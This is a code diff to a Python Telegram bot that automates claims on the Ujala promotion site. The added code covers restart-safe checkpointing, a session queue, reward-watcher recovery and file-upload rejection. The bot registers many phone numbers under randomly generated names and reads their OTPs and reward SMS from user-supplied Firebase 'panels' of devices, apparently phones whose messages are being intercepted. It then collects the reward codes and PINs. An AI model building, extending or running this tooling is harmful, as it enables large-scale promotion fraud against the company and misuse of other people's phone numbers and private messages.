@@ -14,6 +14,7 @@ import os, json, re, base64, random, hmac, hashlib, time, urllib.parse
 import logging, sqlite3
 from datetime import datetime, timedelta
 from functools import wraps
+from types import SimpleNamespace
 
 import aiohttp
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -36,8 +37,23 @@ ADMIN_IDS               = [6909647535, 1446058092, 6894923643]
 WINNER_CHANNEL_ID       = -1004483528498
 FIREBASE_LOG_CHANNEL_ID = -1003758000001
 
-DB_FILE         = "ujala_bot_v3.db"
-PACK_IMAGE_PATH = "ujala_pack.jpg"
+# Railway's local filesystem is not durable. Set RAILWAY_VOLUME_MOUNT_PATH
+# (or DATA_DIR) to the mounted volume so the database survives redeploys.
+SCRIPT_DIR      = os.path.dirname(os.path.abspath(__file__))
+DATA_DIR        = (
+    os.getenv("DATA_DIR")
+    or os.getenv("RAILWAY_VOLUME_MOUNT_PATH")
+    or SCRIPT_DIR
+)
+os.makedirs(DATA_DIR, exist_ok=True)
+DB_FILE         = os.getenv("DB_FILE") or os.path.join(DATA_DIR, "ujala_bot_v701.db")
+PACK_IMAGE_PATH = os.getenv("PACK_IMAGE_PATH") or os.path.join(SCRIPT_DIR, "ujala_pack.jpg")
+if not os.path.isfile(PACK_IMAGE_PATH):
+    # Keep compatibility with deployments that place the image beside the
+    # Railway start command in the project root.
+    root_pack_image = os.path.join(os.getcwd(), "ujala_pack.jpg")
+    if os.path.isfile(root_pack_image):
+        PACK_IMAGE_PATH = root_pack_image
 
 BASE_URL = "https://www.ujalahappiestonam.com"
 API_BASE = f"{BASE_URL}/api"
@@ -63,7 +79,8 @@ OTP_VERIFY_RETRIES = 3   # how many times to re-poll + re-verify if OTP wrong/ex
 SPIN_RETRIES       = 5   # how many times to retry spin before giving up
 SPIN_RETRY_DELAY   = 3   # seconds between spin retries
 BATCH_SIZE         = 5          # concurrent phones per firebase link
-MAX_GLOBAL_SEM     = 50        # global cap — 1 slot per user for ~200 users
+MAX_GLOBAL_SEM     = 200        # global cap — 1 slot per user for ~200 users
+MAX_CONCURRENT_SESSIONS = 10   # max sessions running at same time — queue baaki ko
 
 FIRST_NAMES = ["Rahul","Amit","Sanjay","Vivek","Arjun","Priya","Anjali","Neha","Pooja","Sakshi","Deepak","Rajesh","Manoj","Suresh","Anil"]
 SURNAMES    = ["Nair","Menon","Pillai","Kurian","Varma","Sharma","Kumar","Singh","Patel","Reddy"]
@@ -91,13 +108,16 @@ _global_sem: asyncio.Semaphore = None  # type: ignore
 def get_db():
     conn = sqlite3.connect(DB_FILE, check_same_thread=False, timeout=30)
     conn.row_factory = sqlite3.Row
-    conn.execute("PRAGMA journal_mode=WAL")
     conn.execute("PRAGMA synchronous=NORMAL")
     conn.execute("PRAGMA busy_timeout=10000")
     return conn
 
 def init_db():
     conn = get_db()
+    # Set WAL once during startup. Running this write-mode pragma on every
+    # connection can create lock contention when many phone tasks finish
+    # together.
+    conn.execute("PRAGMA journal_mode=WAL")
     conn.executescript("""
         CREATE TABLE IF NOT EXISTS users (
             user_id         INTEGER PRIMARY KEY,
@@ -123,7 +143,11 @@ def init_db():
             links_count   INTEGER DEFAULT 0,
             success_count INTEGER DEFAULT 0,
             winner_count  INTEGER DEFAULT 0,
-            status        TEXT DEFAULT 'running'
+            status        TEXT DEFAULT 'running',
+            urls_json     TEXT DEFAULT '[]',
+            next_url_index INTEGER DEFAULT 0,
+            next_device_index INTEGER DEFAULT 0,
+            results_json  TEXT DEFAULT '[]'
         );
         CREATE TABLE IF NOT EXISTS winners (
             id            INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -140,6 +164,19 @@ def init_db():
             link       TEXT,
             added_at   TEXT
         );
+        CREATE TABLE IF NOT EXISTS reward_watchers (
+            id          INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id     INTEGER,
+            session_id  INTEGER,
+            username    TEXT,
+            phone       TEXT,
+            firebase_url TEXT,
+            client_id   TEXT,
+            trigger_ms  INTEGER,
+            status      TEXT DEFAULT 'pending',
+            created_at  TEXT,
+            finished_at TEXT
+        );
     """)
     conn.commit()
     # Migration for existing DBs — add refer_credited column if missing
@@ -149,6 +186,20 @@ def init_db():
         logger.info("Migration: added refer_credited column")
     except Exception:
         pass  # Column already exists
+    # Checkpoint columns for sessions created by older versions.
+    migrations = [
+        ("urls_json", "TEXT DEFAULT '[]'"),
+        ("next_url_index", "INTEGER DEFAULT 0"),
+        ("next_device_index", "INTEGER DEFAULT 0"),
+        ("results_json", "TEXT DEFAULT '[]'"),
+    ]
+    for column, definition in migrations:
+        try:
+            conn.execute(f"ALTER TABLE sessions ADD COLUMN {column} {definition}")
+            conn.commit()
+            logger.info("Migration: added sessions.%s", column)
+        except sqlite3.OperationalError:
+            pass  # Column already exists
     conn.close()
 
 # ── DB helpers ─────────────────────────────────────────────────
@@ -236,6 +287,13 @@ def db_get_last_session(user_id):
 
 def db_add_winner(user_id, phone, reward_code, pin, sms_body):
     conn = get_db()
+    existing = conn.execute(
+        "SELECT id FROM winners WHERE user_id=? AND phone=? AND reward_code=? LIMIT 1",
+        (user_id, phone, reward_code),
+    ).fetchone()
+    if existing:
+        conn.close()
+        return False
     conn.execute("""
         INSERT INTO winners (user_id, phone, reward_code, pin, sms_body, found_at)
         VALUES (?,?,?,?,?,?)
@@ -243,6 +301,7 @@ def db_add_winner(user_id, phone, reward_code, pin, sms_body):
     conn.execute("UPDATE users SET total_winners = total_winners + 1 WHERE user_id=?", (user_id,))
     conn.commit()
     conn.close()
+    return True
 
 def db_add_success(user_id):
     conn = get_db()
@@ -257,23 +316,104 @@ def db_log_firebase_link(user_id, link):
     conn.commit()
     conn.close()
 
-def db_new_session(user_id, links_count):
+def db_new_session(user_id, valid_urls):
+    links_count = len(valid_urls)
     conn = get_db()
     cur = conn.execute("""
-        INSERT INTO sessions (user_id, started_at, links_count, status)
-        VALUES (?,?,?,?)
-    """, (user_id, datetime.now().isoformat(), links_count, "running"))
+        INSERT INTO sessions
+            (user_id, started_at, links_count, status, urls_json, results_json)
+        VALUES (?,?,?,?,?,?)
+    """, (user_id, datetime.now().isoformat(), links_count, "running",
+          json.dumps(valid_urls), "[]"))
     sid = cur.lastrowid
     conn.commit()
     conn.close()
     return sid
 
+def db_get_session(session_id):
+    conn = get_db()
+    row = conn.execute("SELECT * FROM sessions WHERE id=?", (session_id,)).fetchone()
+    conn.close()
+    return row
+
+def db_get_running_sessions():
+    conn = get_db()
+    rows = conn.execute(
+        "SELECT * FROM sessions WHERE status='running' ORDER BY started_at ASC"
+    ).fetchall()
+    conn.close()
+    return rows
+
+def db_mark_session_stopped(session_id, reason="stopped"):
+    """Explicitly stop a session so it is not restarted after /stop."""
+    conn = get_db()
+    conn.execute(
+        "UPDATE sessions SET status=?, finished_at=? WHERE id=? AND status='running'",
+        (reason, datetime.now().isoformat(), session_id),
+    )
+    conn.commit()
+    conn.close()
+
+def db_checkpoint_session(session_id, next_url_index, next_device_index,
+                          success_count, winner_count, results_text):
+    """Persist a restart-safe position after every completed device batch."""
+    conn = get_db()
+    conn.execute("""
+        UPDATE sessions
+        SET next_url_index=?, next_device_index=?,
+            success_count=?, winner_count=?, results_json=?
+        WHERE id=? AND status='running'
+    """, (
+        next_url_index,
+        next_device_index,
+        success_count,
+        winner_count,
+        json.dumps(results_text[-200:], ensure_ascii=False),
+        session_id,
+    ))
+    conn.commit()
+    conn.close()
+
 def db_finish_session(session_id, success_count, winner_count):
     conn = get_db()
     conn.execute("""
         UPDATE sessions SET finished_at=?, success_count=?, winner_count=?, status='done'
-        WHERE id=?
+        WHERE id=? AND status='running'
     """, (datetime.now().isoformat(), success_count, winner_count, session_id))
+    conn.commit()
+    conn.close()
+
+def db_add_reward_watcher(user_id, session_id, username, phone,
+                          firebase_url, client_id, trigger_ms):
+    conn = get_db()
+    cur = conn.execute("""
+        INSERT INTO reward_watchers
+            (user_id, session_id, username, phone, firebase_url, client_id,
+             trigger_ms, status, created_at)
+        VALUES (?,?,?,?,?,?,?,?,?)
+    """, (
+        user_id, session_id, username or "", phone, firebase_url, client_id,
+        trigger_ms, "pending", datetime.now().isoformat(),
+    ))
+    watcher_id = cur.lastrowid
+    conn.commit()
+    conn.close()
+    return watcher_id
+
+def db_get_pending_reward_watchers():
+    conn = get_db()
+    rows = conn.execute(
+        "SELECT * FROM reward_watchers WHERE status='pending' ORDER BY created_at ASC"
+    ).fetchall()
+    conn.close()
+    return rows
+
+def db_finish_reward_watcher(watcher_id):
+    conn = get_db()
+    conn.execute(
+        "UPDATE reward_watchers SET status='done', finished_at=? WHERE id=?",
+        (datetime.now().isoformat(), watcher_id),
+    )
     conn.commit()
     conn.close()
 
@@ -865,7 +1005,7 @@ async def process_number(phone, client_id, firebase_url, image_bytes,
                 return {"phone": phone, "status": "already_used", "reward": ""}
 
         # Each phone gets its own HTTP session — matches working script behaviour
-        phone_conn = aiohttp.TCPConnector(ssl=False)
+        phone_conn = aiohttp.TCPConnector(ssl=True)
         async with aiohttp.ClientSession(connector=phone_conn, headers=HEADERS_BASE) as phone_sess:
 
             # Step 1: Register
@@ -964,16 +1104,24 @@ async def process_number(phone, client_id, firebase_url, image_bytes,
 #  🏆 WINNER WATCHER (async task)
 # ============================================================
 async def watch_for_reward(context, uid, username, phone, firebase_url,
-                           client_id, trigger_ms):
+                           client_id, trigger_ms, watcher_id=None,
+                           max_wait_seconds=None):
     """
     Background watcher — polls Firebase for reward SMS after a win.
     Runs independently of session — survives session end.
     First check is immediate (no sleep), then every REWARD_SMS_POLL_INTERVAL seconds.
     """
     _loop = asyncio.get_running_loop()
-    deadline = _loop.time() + REWARD_SMS_MAX_WAIT
+    deadline = _loop.time() + (
+        REWARD_SMS_MAX_WAIT if max_wait_seconds is None
+        else max(0, max_wait_seconds)
+    )
 
     # Notify user watcher has started
+    if max_wait_seconds is not None and max_wait_seconds <= 0:
+        if watcher_id:
+            db_finish_reward_watcher(watcher_id)
+        return
     try:
         await context.bot.send_message(
             uid,
@@ -985,7 +1133,7 @@ async def watch_for_reward(context, uid, username, phone, firebase_url,
     except Exception:
         pass
 
-    conn = aiohttp.TCPConnector(ssl=False)
+    conn = aiohttp.TCPConnector(ssl=True)
     async with aiohttp.ClientSession(connector=conn) as http:
         first_check = True
         while _loop.time() < deadline:
@@ -1001,7 +1149,11 @@ async def watch_for_reward(context, uid, username, phone, firebase_url,
                 if isinstance(msgs, dict):
                     code, pin, body = extract_reward_code_sms(msgs, trigger_ms)
                     if code:
-                        db_add_winner(uid, phone, code, pin, body)
+                        is_new_winner = db_add_winner(uid, phone, code, pin, body)
+                        if watcher_id:
+                            db_finish_reward_watcher(watcher_id)
+                        if not is_new_winner:
+                            return
                         await notify_winner_channel(context, uid, username, phone, code, pin, body)
                         pin_line = f"🔑 PIN: <code>{pin}</code>\n" if pin else ""
                         await context.bot.send_message(
@@ -1018,6 +1170,8 @@ async def watch_for_reward(context, uid, username, phone, firebase_url,
                 logger.warning(f"Reward watcher error [{phone}]: {e}")
 
     # Timed out — notify user
+    if watcher_id:
+        db_finish_reward_watcher(watcher_id)
     try:
         await context.bot.send_message(
             uid,
@@ -1034,14 +1188,86 @@ async def watch_for_reward(context, uid, username, phone, firebase_url,
 #  ⚙️  RUN SESSION (async task — no threads)
 # ============================================================
 async def run_session_task(context, uid, username, valid_urls, image_bytes, session_id):
-    # Per-user lock: only one session can run at a time for this uid
-    async with _get_user_lock(uid):
-        await _run_session_body(context, uid, username, valid_urls, image_bytes, session_id)
+    """Queue-aware session runner — max MAX_CONCURRENT_SESSIONS at a time."""
+    # Assign queue position before acquiring semaphore
+    async with _queue_lock:
+        pos = len(_session_queue_positions) + 1
+        _session_queue_positions[uid] = pos
 
-async def _run_session_body(context, uid, username, valid_urls, image_bytes, session_id):
-    success_count = 0
-    winner_count  = 0
-    results_text  = []
+    # Notify user of queue position if waiting
+    if pos > 1:
+        try:
+            await context.bot.send_message(
+                uid,
+                f"⏳ <b>Queue mein ho!</b>\n\n"
+                f"Position: <b>#{pos}</b>\n"
+                f"Jab tumhari baari aayegi, session automatically start ho jaayega.",
+                parse_mode=ParseMode.HTML
+            )
+        except Exception:
+            pass
+
+    # Wait for slot — FIFO order via semaphore
+    await _session_semaphore.acquire()
+
+    # Update queue position after acquiring
+    async with _queue_lock:
+        _session_queue_positions.pop(uid, None)
+        active_count = MAX_CONCURRENT_SESSIONS - _session_semaphore._value
+        if pos > 1:
+            try:
+                await context.bot.send_message(
+                    uid,
+                    f"✅ <b>Tumhari baari aayi!</b>\nSession ab start ho raha hai... ({active_count}/{MAX_CONCURRENT_SESSIONS} slots used)",
+                    parse_mode=ParseMode.HTML
+                )
+            except Exception:
+                pass
+
+    try:
+        # Per-user lock: only one session can run at a time for this uid.
+        async with _get_user_lock(uid):
+            session = db_get_session(session_id)
+        if not session:
+            logger.error("Cannot resume missing session_id=%s", session_id)
+            return
+        try:
+            resume_url_index = int(session["next_url_index"] or 0)
+            resume_device_index = int(session["next_device_index"] or 0)
+            initial_success_count = int(session["success_count"] or 0)
+            initial_winner_count = int(session["winner_count"] or 0)
+            initial_results = json.loads(session["results_json"] or "[]")
+            if not isinstance(initial_results, list):
+                initial_results = []
+        except (TypeError, ValueError, json.JSONDecodeError):
+            logger.warning(
+                "Invalid checkpoint for session_id=%s; restarting current panel",
+                session_id,
+            )
+            resume_url_index = resume_device_index = 0
+            initial_success_count = initial_winner_count = 0
+            initial_results = []
+
+        await _run_session_body(
+                context, uid, username, valid_urls, image_bytes, session_id,
+                resume_url_index, resume_device_index,
+                initial_success_count, initial_winner_count, initial_results,
+            )
+    finally:
+        _session_semaphore.release()
+
+async def _run_session_body(
+    context, uid, username, valid_urls, image_bytes, session_id,
+    resume_url_index=0, resume_device_index=0,
+    initial_success_count=0, initial_winner_count=0, initial_results=None,
+):
+    # Recovery is intentionally batch-safe: a crash during a batch retries that
+    # batch, while every completed batch is durable in SQLite.
+    success_count = initial_success_count
+    winner_count  = initial_winner_count
+    results_text  = list(initial_results or [])
+    completed = False
+    stop_requested = False
 
     # ── Live progress message — edit karte rahenge ────────────────────────
     def _bar(done, total, width=10):
@@ -1069,11 +1295,14 @@ async def _run_session_body(context, uid, username, valid_urls, image_bytes, ses
         except Exception:
             pass
 
-    conn = aiohttp.TCPConnector(ssl=False, limit=100)
+    conn = aiohttp.TCPConnector(ssl=True, limit=100)
     try:
         async with aiohttp.ClientSession(connector=conn, headers=HEADERS_BASE) as http:
             for url_idx, firebase_url in enumerate(valid_urls):
+                if url_idx < resume_url_index:
+                    continue
                 if not _active_sessions.get(uid, {}).get("running"):
+                    stop_requested = True
                     break
 
                 await _update(
@@ -1088,21 +1317,31 @@ async def _run_session_body(context, uid, username, valid_urls, image_bytes, ses
                         f"⚠️ <b>Panel {url_idx+1}/{len(valid_urls)}</b>\n"
                         f"No online devices found."
                     )
+                    db_checkpoint_session(
+                        session_id, url_idx + 1, 0,
+                        success_count, winner_count, results_text,
+                    )
                     continue
 
                 total_devices  = len(devices)
-                done_devices   = 0
+                first_device_index = resume_device_index if url_idx == resume_url_index else 0
+                done_devices   = first_device_index
                 total_batches  = (total_devices + BATCH_SIZE - 1) // BATCH_SIZE
 
                 await _update(
                     f"📱 <b>Panel {url_idx+1}/{len(valid_urls)}</b>\n"
-                    f"Found <b>{total_devices}</b> device(s) — starting...\n\n"
-                    f"{_bar(0, total_devices)} 0/{total_devices}"
+                    f"Found <b>{total_devices}</b> device(s) — resuming...\n\n"
+                    f"{_bar(done_devices, total_devices)} {done_devices}/{total_devices}"
                 )
 
-                # Process in batches of BATCH_SIZE
-                for batch_idx, i in enumerate(range(0, total_devices, BATCH_SIZE)):
+                # Process in batches of BATCH_SIZE. On recovery, skip batches
+                # whose completion was already written to SQLite.
+                for batch_idx, i in enumerate(
+                    range(first_device_index, total_devices, BATCH_SIZE),
+                    start=first_device_index // BATCH_SIZE,
+                ):
                     if not _active_sessions.get(uid, {}).get("running"):
+                        stop_requested = True
                         break
 
                     batch = devices[i:i + BATCH_SIZE]
@@ -1136,11 +1375,18 @@ async def _run_session_body(context, uid, username, valid_urls, image_bytes, ses
                             results_text.append(f"✅ {phone} → {reward}")
                             if is_50_rupee_reward(reward) or is_flipkart_reward(reward):
                                 winner_count += 1
+                                watcher_id = db_add_reward_watcher(
+                                    uid, session_id, username, phone,
+                                    result.get("firebase_url", firebase_url),
+                                    result.get("client_id", ""),
+                                    result.get("trigger_time_ms", int(time.time() * 1000)),
+                                )
                                 asyncio.create_task(watch_for_reward(
                                     context, uid, username, phone,
                                     result.get("firebase_url", firebase_url),
                                     result.get("client_id", ""),
-                                    result.get("trigger_time_ms", int(time.time() * 1000))
+                                    result.get("trigger_time_ms", int(time.time() * 1000)),
+                                    watcher_id,
                                 ))
                         elif status == "already_used":
                             results_text.append(f"⏭ {phone} — already used")
@@ -1158,14 +1404,27 @@ async def _run_session_body(context, uid, username, valid_urls, image_bytes, ses
                         f"⏰ {sum(1 for r in results_text if 'OTP timeout' in r)}  "
                         f"❌ {sum(1 for r in results_text if r.startswith('❌'))}"
                     )
+                    next_device_index = i + len(batch)
+                    db_checkpoint_session(
+                        session_id,
+                        url_idx + 1 if next_device_index >= total_devices else url_idx,
+                        0 if next_device_index >= total_devices else next_device_index,
+                        success_count,
+                        winner_count,
+                        results_text,
+                    )
+
+            completed = not stop_requested
 
     except Exception as e:
-        logger.error(f"Session error uid={uid}: {e}")
+        # Keep status='running' so the next process boot can recover it from
+        # the last completed checkpoint instead of falsely marking it done.
+        logger.exception("Session error uid=%s session_id=%s", uid, session_id)
     finally:
-        db_finish_session(session_id, success_count, winner_count)
+        if completed:
+            db_finish_session(session_id, success_count, winner_count)
         _active_sessions.pop(uid, None)
 
-        summary = "\n".join(results_text[:30])
         try:
             # Delete progress message, send final summary as new message
             if prog_id:
@@ -1173,14 +1432,45 @@ async def _run_session_body(context, uid, username, valid_urls, image_bytes, ses
                     await context.bot.delete_message(uid, prog_id)
                 except Exception:
                     pass
-            await context.bot.send_message(
-                uid,
-                f"✅ <b>Session Complete!</b>\n\n"
-                f"✅ Success: {success_count}\n"
-                f"🏆 Winners: {winner_count}\n\n"
-                f"<b>Details:</b>\n{summary}",
-                parse_mode=ParseMode.HTML
-            )
+            if completed:
+                total_processed = len(results_text)
+                header = (
+                    f"✅ <b>Session Complete!</b>\n\n"
+                    f"✅ Success: {success_count}\n"
+                    f"🏆 Winners: {winner_count}\n"
+                    f"📊 Total processed: {total_processed}\n\n"
+                    f"<b>Details:</b>\n"
+                )
+                # Telegram message limit ~4096 chars — split if needed
+                MAX_MSG = 3800
+                body = "\n".join(results_text)
+                full_msg = header + body
+                if len(full_msg) <= MAX_MSG:
+                    await context.bot.send_message(uid, full_msg, parse_mode=ParseMode.HTML)
+                else:
+                    # Send header first, then chunks
+                    await context.bot.send_message(uid, header, parse_mode=ParseMode.HTML)
+                    chunk = ""
+                    for line in results_text:
+                        if len(chunk) + len(line) + 1 > MAX_MSG:
+                            await context.bot.send_message(uid, chunk, parse_mode=ParseMode.HTML)
+                            chunk = line
+                        else:
+                            chunk = chunk + "\n" + line if chunk else line
+                    if chunk:
+                        await context.bot.send_message(uid, chunk, parse_mode=ParseMode.HTML)
+            elif stop_requested:
+                await context.bot.send_message(
+                    uid,
+                    "⏹ Session stopped. Completed batches were saved.",
+                )
+            else:
+                await context.bot.send_message(
+                    uid,
+                    "⚠️ Session temporarily stopped because of a server error. "
+                    "It will resume automatically from the last completed batch "
+                    "after the bot restarts.",
+                )
         except Exception:
             pass
 
@@ -1189,6 +1479,12 @@ async def _run_session_body(context, uid, username, valid_urls, image_bytes, ses
 # ============================================================
 _active_sessions: dict = {}              # uid -> {"running": bool, "session_id": int}
 _user_locks: dict[int, asyncio.Lock] = {}  # per-user lock — guarantees session isolation
+
+# ── Session Queue ──────────────────────────────────────────────
+# Max 10 sessions ek saath — baaki queue mein wait karenge
+_session_semaphore: asyncio.Semaphore = None   # type: ignore — set at startup
+_session_queue_positions: dict = {}            # uid -> queue position (1-based)
+_queue_lock: asyncio.Lock = None               # type: ignore — set at startup
 
 def _get_user_lock(uid: int) -> asyncio.Lock:
     """Return (creating if needed) the dedicated asyncio.Lock for this user."""
@@ -1400,7 +1696,7 @@ async def cmd_refercount(update: Update, context: ContextTypes.DEFAULT_TYPE):
     row = db_get_user(uid)
     cnt = row["refer_count"] if row else 0
     await update.effective_message.reply_text(
-        f"👥 <b>Your Refer Count</b>\n\nTotal successful refers: <b>{cnt}</b>\nValidity earned: <b>{cnt} hour(s)</b>",
+        f"👥 <b>Your Refer Count</b>\n\nTotal successful refers: <b>{cnt}</b>\nValidity earned: <b>{cnt // 2} hour(s)</b> (har 2 refers pe 1 hour)",
         parse_mode=ParseMode.HTML
     )
 
@@ -1502,6 +1798,18 @@ async def cmd_run(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if _active_sessions.get(uid, {}).get("running"):
         await update.effective_message.reply_text("⚠️ Already have a running session. Use /stop first.")
         return
+    # Show queue info if slots are full
+    if _session_semaphore is not None:
+        waiting = len(_session_queue_positions)
+        slots_free = _session_semaphore._value
+        if slots_free == 0:
+            await update.effective_message.reply_text(
+                f"⏳ <b>Sab slots busy hain!</b>\n\n"
+                f"🔄 Running: {MAX_CONCURRENT_SESSIONS}/{MAX_CONCURRENT_SESSIONS}\n"
+                f"👥 Queue mein: {waiting} log\n\n"
+                f"Firebase link bhejo — queue mein add ho jaoge aur baari pe start hoga.",
+                parse_mode=ParseMode.HTML
+            )
     await update.effective_message.reply_text(
         "📋 <b>Send your Firebase link</b>\n\n• Send <b>1 link only</b> per session\n• Your session is fully private\n\nType /cancel to cancel.",
         parse_mode=ParseMode.HTML
@@ -1551,7 +1859,7 @@ async def handle_firebase_links(update: Update, context: ContextTypes.DEFAULT_TY
         parse_mode=ParseMode.HTML
     )
 
-    session_id = db_new_session(uid, len(valid_urls))
+    session_id = db_new_session(uid, valid_urls)
     db_set_last_session(uid)
     _active_sessions[uid] = {"running": True, "session_id": session_id}
 
@@ -1560,13 +1868,45 @@ async def handle_firebase_links(update: Update, context: ContextTypes.DEFAULT_TY
         context, uid, user.username, valid_urls, image_bytes, session_id
     ))
 
+async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """User ne file upload ki — reject karo, text link maango."""
+    if not context.user_data.get("awaiting_links"):
+        return
+    msg = update.message
+    if msg.document:
+        fname   = msg.document.file_name or "file"
+        size_mb = round(msg.document.file_size / (1024 * 1024), 1)
+        await msg.reply_text(
+            f"❌ <b>File upload supported nahi hai!</b>\n\n"
+            f"File: <code>{fname}</code> ({size_mb} MB)\n\n"
+            f"✅ Apna <b>Firebase URL</b> text mein bhejo.\n"
+            f"Example:\n<code>https://your-app-default-rtdb.firebaseio.com/</code>",
+            parse_mode=ParseMode.HTML
+        )
+    elif msg.photo:
+        await msg.reply_text(
+            "❌ <b>Image nahi chalegi!</b>\n\n"
+            "✅ Firebase URL text mein bhejo.",
+            parse_mode=ParseMode.HTML
+        )
+
+
 async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
-    if uid in _active_sessions:
-        _active_sessions[uid]["running"] = False
+    info = _active_sessions.get(uid)
+    if info:
+        info["running"] = False
+        db_mark_session_stopped(info.get("session_id"), "stopped")
         await update.effective_message.reply_text("⏹ Stop requested. Will finish current batch and stop.")
     else:
-        await update.effective_message.reply_text("No active session found.")
+        # Also stop a session that may still be marked running after a process
+        # was interrupted, so the next boot does not resume it.
+        rows = [r for r in db_get_running_sessions() if r["user_id"] == uid]
+        if rows:
+            db_mark_session_stopped(rows[-1]["id"], "stopped")
+            await update.effective_message.reply_text("⏹ Session stopped. It will not resume after restart.")
+        else:
+            await update.effective_message.reply_text("No active session found.")
 
 async def cmd_results(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid  = update.effective_user.id
@@ -1819,6 +2159,105 @@ async def cmd_adminlist(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode=ParseMode.HTML
     )
 
+class _RecoveryContext:
+    """Minimal context for restart recovery — only bot attribute needed by watchers."""
+    def __init__(self, bot):
+        self.bot = bot
+    def __getattr__(self, name):
+        # Prevent AttributeError on unexpected access — return None gracefully
+        return None
+
+async def recover_after_restart(app):
+    """Recreate in-memory tasks that were interrupted by a process restart."""
+    context = _RecoveryContext(app.bot)
+    image_path = PACK_IMAGE_PATH
+    image_bytes = None
+    if os.path.isfile(image_path):
+        try:
+            with open(image_path, "rb") as f:
+                image_bytes = f.read()
+        except OSError:
+            logger.exception("Cannot read pack image at %s", image_path)
+    else:
+        logger.error(
+            "Cannot recover active sessions: pack image is missing at %s",
+            image_path,
+        )
+
+    resumed = 0
+    for row in db_get_running_sessions():
+        try:
+            if image_bytes is None:
+                break
+            urls = json.loads(row["urls_json"] or "[]")
+            if not isinstance(urls, list) or not urls:
+                raise ValueError("session has no saved Firebase URLs")
+            uid = int(row["user_id"])
+            user = db_get_user(uid)
+            username = user["username"] if user else ""
+            _active_sessions[uid] = {
+                "running": True,
+                "session_id": row["id"],
+                "resumed": True,
+            }
+            asyncio.create_task(
+                run_session_task(
+                    context, uid, username, urls, image_bytes, row["id"]
+                )
+            )
+            resumed += 1
+        except Exception:
+            logger.exception(
+                "Could not recover session_id=%s; marking it failed",
+                row["id"],
+            )
+            conn = get_db()
+            conn.execute(
+                "UPDATE sessions SET status='failed', finished_at=? WHERE id=?",
+                (datetime.now().isoformat(), row["id"]),
+            )
+            conn.commit()
+            conn.close()
+
+    # Reward watchers live longer than the main session. Restore their
+    # remaining polling time as well, using the saved created_at timestamp.
+    watchers = 0
+    now = datetime.now()
+    for row in db_get_pending_reward_watchers():
+        try:
+            created_at = datetime.fromisoformat(row["created_at"])
+            elapsed = max(0, (now - created_at).total_seconds())
+            remaining = REWARD_SMS_MAX_WAIT - elapsed
+            if remaining <= 0:
+                db_finish_reward_watcher(row["id"])
+                continue
+            asyncio.create_task(
+                watch_for_reward(
+                    context,
+                    row["user_id"],
+                    row["username"],
+                    row["phone"],
+                    row["firebase_url"],
+                    row["client_id"],
+                    row["trigger_ms"],
+                    row["id"],
+                    remaining,
+                )
+            )
+            watchers += 1
+        except Exception:
+            logger.exception(
+                "Could not recover reward watcher id=%s",
+                row["id"],
+            )
+
+    if resumed or watchers:
+        logger.info(
+            "Restart recovery scheduled: %s session(s), %s reward watcher(s)",
+            resumed,
+            watchers,
+        )
+
 # ── Inline button handler ──────────────────────────────────────
 class _FakeUpdate:
     def __init__(self, update, message):
@@ -1882,8 +2321,10 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 #  🚀 MAIN
 # ============================================================
 def main():
-    global _global_sem, BOT_USERNAME
-    _global_sem = asyncio.Semaphore(MAX_GLOBAL_SEM)
+    global _global_sem, BOT_USERNAME, _session_semaphore, _queue_lock
+    _global_sem        = asyncio.Semaphore(MAX_GLOBAL_SEM)
+    _session_semaphore = asyncio.Semaphore(MAX_CONCURRENT_SESSIONS)
+    _queue_lock        = asyncio.Lock()
 
     from telegram.request import HTTPXRequest
     request = HTTPXRequest(
@@ -1916,6 +2357,7 @@ def main():
     app.add_handler(CommandHandler("adminlist",      cmd_adminlist))
     app.add_handler(CommandHandler("alltime",        cmd_alltime))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_firebase_links))
+    app.add_handler(MessageHandler(filters.Document.ALL | filters.PHOTO, handle_file_upload))
     app.add_handler(CallbackQueryHandler(handle_callback))
     app.job_queue.run_repeating(check_expiry_warnings, interval=60, first=10)
 
@@ -1926,7 +2368,11 @@ def main():
         BOT_USERNAME = me.username
         logger.info(f"Bot username set: @{BOT_USERNAME}")
 
-    app.post_init = _set_bot_username
+    async def _post_init(app):
+        await _set_bot_username(app)
+        await recover_after_restart(app)
+
+    app.post_init = _post_init
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
